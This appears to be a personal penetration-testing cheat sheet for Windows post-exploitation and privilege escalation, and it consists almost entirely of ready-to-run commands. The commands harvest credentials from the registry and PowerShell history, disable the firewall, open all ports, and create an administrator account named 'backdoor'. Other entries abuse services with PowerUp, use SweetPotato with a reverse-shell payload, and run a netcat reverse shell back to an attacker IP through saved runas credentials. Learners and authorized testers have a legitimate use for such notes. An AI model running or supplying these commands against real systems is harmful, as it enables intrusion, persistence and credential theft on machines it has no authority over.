
```sh
#public folder shared accross the domain  
net share public=c:\users\public  /Grant:Everyone,FULL

#if there is an issue try to fix the sec permissions
#properties sharing locations  add everyone in the  enter object  

# Search registry for credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>$null

reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" 2>$null


# PowerShell history
Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*" -ErrorAction SilentlyContinue
```

```sh

# 1.enable rdp
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# 2. Disable Firewall
netsh advfirewall set allprofiles state off


# 3. Set RDP Port (optional)
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v PortNumber /d 3389 /f

# 4. Change Admin Password
net user administrator "password123"

# add user account
net user  backdoor password123 /add

# add backdoor to admin group 
net localgroup Administrators backdoor /add

# 5. Start RDP Services
net start TermService
sc config TermService start= auto

#add rule tcp
netsh advfirewall firewall add rule name="Open All Ports" dir=in action=allow protocol=TCP localport=0-65535

```


#### pspy64

Tool that Enumerate processes without root permession

Steps: 
- Enumerate arch to know which binary we need `uname -a`
- download the correct binary
- transfer it from attacker machine `python server`
- execute it on victim machine

#### accesschk

check file permessions 

```ls
.\accesschk.exe /accepteula -quvw stef C:\Users\Administrator\Desktop\Backup.ps1
```
#### SweetPotato

`https://github.com/CCob/SweetPotato `

A collection of various native Windows privilege escalation techniques from service accounts to SYSTEM

if we have in the userPriv impersonation enabled we can use this tool to exploit it 

```
sweet.exe -e [exploit mode] '[payload binary]'

payload bindary = reverse tcp shell 
```


#### WinPeas


```powershell
#stealth
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args log

#execute for only services information
.\winPEAS.exe quiet serviceinfo
```


>Service Commands
```sh
Get-Service

Get-Service | Select-Object Displayname,Status,ServiceName

Get-CimInstance -ClassName win32_service | Select,State,PathName

#queries the configuration of a Windows service. 
#use in cmd sc
sc qeury | findstr "soemthing"

sc qc "something"

# service create
sc create SimpleService binPath="C:\TEMP"

# service config
sc config <service> binPath="C:\TEMP"

# service permission
sc sdshow <service>

# since sdshow shows SDDL which is hard to read use this bin to read it better 
ConvertFrom-SddlString -Sddl <SDDL>

Get-Service * | Select-Object Displayname,Status,ServiceName, Can*


Start <Service>
Stop <Service>
```

```sh
#NSSM ->  service manager
nssm.exe install <service-name>
```

>RunAs
```sh
#spawns a shell with specific user 
runas /netonly /users:USER1 cmd
```


>Process Commands
```sh
#recursive search in cmd
dir /s /b *.txt

#recursive search in powershell
Get-ChildItem -Recurse -Filter '*.txt' -ErrorAction SilentyContinue

#installed aps
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 


#what users we have
net user
net user <User>

#check users in the domain
net user /domain
net user <user> /domain

#auth Checks
icalcs <file>

# Grant Permissions
icalcs  test.txt /grant hostname\username:R /t /c
```

#### UserSwitch 


```shell
cmdkey /list
```

Execute a command in **Runas**

```shell
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Users\security\nc.exe -e cmd.exe 10.10.14.10 1337"
```



https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1


```shell
Invoke-RunasCs svc_mssql trustno1 'cmd.exe /c whoami'
```


```shell 
PS C:\Users\dave> $password = ConvertTo-SecureString "pwd123" -AsPlainText -Force

PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)

PS C:\Users\dave>  Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred [CLIENTWK220]:

```
#### Serivce DLL ENUM

```sh
Listdlls64.exe  /acceteula <serviceName>
```


#### PrivescCheck
```powershell 
https://github.com/itm4n/PrivescCheck

. C:\AD\Tools\PrivEscCheck.ps1
Invoke-PrivescCheck

```

#### PowerUP
```powershell

#Run all Checks
Invoke-AllChecks

#abusing functions
check AbuseFunction for abuse 

#get service with unquoted paths and a space in their name
Get-ServiceUnquoted -Verbose

#get service where the current user can write to its binary path change arguments to the binary
Get-ModifiableServiceFile -Verbose

#Get the service whos configuration current user can modify
Get-ModifiableService -Verbose


#Service abuse
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName dcorp\student1 -Verbose #after detecting the service vuln running this will execute a command that adds our user to admin  AbyssWebServer net localgroup Administrators dcorp\student1 /add
 
#help
help Invoke-ServiceAbuse
```

- https://learn.microsoft.com/en-us/sysinternals/downloads/listdlls
- https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order
- https://malicious.link/posts/2020/compiling-a-dll-using-mingw/